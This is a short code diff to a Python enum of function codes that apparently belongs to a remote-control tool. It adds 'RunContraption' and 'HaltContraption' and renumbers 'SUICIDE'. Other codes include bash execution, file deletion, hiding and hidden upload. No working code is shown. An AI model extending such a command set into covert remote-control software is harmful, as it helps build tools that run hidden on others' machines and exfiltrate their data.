@@ -9,7 +9,9 @@ class FunCode(IntFlag):
     DELETE_FILE = 2
     RUN_BASH = 3
     HIDER_SETUP = 4
-    SUICIDE = 5
+    RunContraption = 5
+    HaltContraption = 6
+    SUICIDE = 7
 
     HIDDEN_OPRATION = 1 << 6
     HIDDEN_UPLOAD = 1 << 1
